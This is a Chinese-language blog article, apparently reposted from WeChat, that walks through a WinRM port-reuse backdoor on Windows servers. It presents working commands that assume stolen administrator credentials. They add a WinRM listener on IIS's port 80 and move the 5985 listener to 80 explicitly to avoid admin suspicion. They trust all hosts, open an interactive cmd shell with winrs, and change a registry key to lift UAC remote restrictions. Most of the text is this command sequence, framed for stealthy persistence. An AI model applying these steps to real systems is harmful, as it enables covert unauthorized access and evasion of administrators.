<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/unZEw-0r4LJKCGTAIsHYUA)

### 0x01 简介

该后门的基本原理是使用 Windows 的远程管理管理服务 WinRM，组合 HTTP.sys 驱动自带的端口复用功能，一起实现正向的端口复用后门。

具体细节信息请参考：https://paper.seebug.org/1004/

### 0x02 复现

#### 2.1 环境信息

此次的后门连接是需要目标服务器的高权用户的明文密码的，需要先抓取相应的明文密码才可部署后门：

首先查看目标服务器时候能够正常使用 WinRM 服务：  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rgHsQiafgQSjZ4pbubEZIAnia5FRuQicFdPA4Axa0F6zCdOGKmpwphFFXull9uOJTts4UF0vMBda8em96q7icLicAhQ/640?wx_fmt=png)

在 Windows 2012 以上的服务器操作系统中，WinRM 服务默认启动并监听了 5985 端口。

Copy

对于 Windows 2008 来说，需要使用命令来启动 WinRM 服务，快速配置和启动的命令是`winrm quickconfig -q`，这条命令运行后会自动添加防火墙例外规则，放行 5985 端口。

#### 2.2 复用 80 端口

目标服务器本身是存在 IIS 服务器的，开放端口也是默认的 80 端口：  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rgHsQiafgQSjZ4pbubEZIAnia5FRuQicFdPadaibBpNe7BXEWukxKd28xRHXj9IhKibbpm6HMB6KgleYFv3iayeh0ofA/640?wx_fmt=png)

对于原本就开放了 WinRM 服务的机器来讲，需要保留原本的 5985 端口 listener，同时需要新增一个 80 端口的 listener，这样既能保证原来的 5985 端口管理员可以使用，我们也能通过 80 端口连接 WinRM。

使用下面这条命令即可新增一个 80 端口的 listener

```
winrm set winrm/config/service @{EnableCompatibilityHttpListener="true"}


```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rgHsQiafgQSjZ4pbubEZIAnia5FRuQicFdPBUXTjt2h5nCRdeH7PibanPxtzCk0Ebt6QEcP2StLmqoEnwwZickTj9Yg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rgHsQiafgQSjZ4pbubEZIAnia5FRuQicFdPDLLxlILqxSaSTTveia2RBmC1t6ZzZ1C4e15yxBgAQ0PztNAdib0qGjxQ/640?wx_fmt=png)

对于安装 Windows 2012 及以上版本操作系统的服务器来讲，只需要这一条命令即可实现端口复用。

这种情况下，老的 5985 端口 listener 还保留着:

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rgHsQiafgQSjZ4pbubEZIAnia5FRuQicFdP28yb6icENdAVeFs72B8DyHibdTs0l2xxS3csxL7pIVyfsywNDyYzWMicQ/640?wx_fmt=png)

当目标服务器上，本省并未启用 WinRM 服务的话，那么需要把默认的 5985 端口修改成 web 服务端口 80，否则管理员上来看到一个 5985 端口就可能起疑心。

通过下面这条命令即可修改端口为 80

```
winrm set winrm/config/Listener?Address=*+Transport=HTTP @{Port="80"}


```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rgHsQiafgQSjZ4pbubEZIAnia5FRuQicFdP0AP8cwYiahWmEyWHv3HOzBKmlxIibyEtHNCBO3I6mYmyeQJ6ibcDQAXJA/640?wx_fmt=png)

这种情况下，管理员查看端口也看不到 5985 开放，只开放 80 端口:

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rgHsQiafgQSjZ4pbubEZIAnia5FRuQicFdPs6gxGDT01RicUmPt44gn9iaxq8gMjnOxpNKLOPfxLicy9pMlHpypVGIkg/640?wx_fmt=png)

经过配置之后，WinRM 已经在 80 端口上监听了一个 listener，与此同时，IIS 的 web 服务也能完全正常运行。

#### 2.3 后门的使用

本地需要连接 WinRM 服务时，首先也需要配置启动 WinRM 服务，然后需要设置信任连接的主机，执行以下两条命令即可

```
winrm quickconfig -q
winrm set winrm/config/Client @{TrustedHosts="*"}


```

开启 WinRM 客户端后，使用 winrs 命令即可连接远程 WinRM 服务执行命令（这里的账号密码即是目标服务器本地存在的用户）

```
winrs -r:http://192.168.126.133 -u:administrator -p:admin123. ipconfig


```

上述命令会在远程机器上执行 ipconfig 命令，获取结果后直接退出

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rgHsQiafgQSjZ4pbubEZIAnia5FRuQicFdP7ibVyiahmIqRoX3LJkzQMN2IibsT5hdBS904x5mRzZHqtX0MV11r5HP7w/640?wx_fmt=png)

将 ipconfig 命令换成 cmd 即可获取一个交互式的 shell:

```
winrs -r:http://192.168.126.133 -u:administrator -p:admin123. cmd


```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rgHsQiafgQSjZ4pbubEZIAnia5FRuQicFdPvP5mEHpttfRMkkyph6396nqFfRJibET4o3UDEAYPxvcQW8jWRPDdlGg/640?wx_fmt=png)

### 0x03 非管理员用户

WinRM 服务是受 UAC 影响的，所以本地管理员用户组里面只有 administrator 可以登录，其他管理员用户是没法远程登录 WinRM 的。要允许本地管理员组的其他用户登录 WinRM，需要修改注册表设置。

```
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f


```

修改后，普通管理员登录后也是高权限。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rgHsQiafgQSjZ4pbubEZIAnia5FRuQicFdP0yI4THRN7vhSp12KkDpM8uwG0UM9W4Afe0FFdzRUGcMXp7kia4sUaSA/640?wx_fmt=png)

### 0x04 参考链接

https://paper.seebug.org/1004/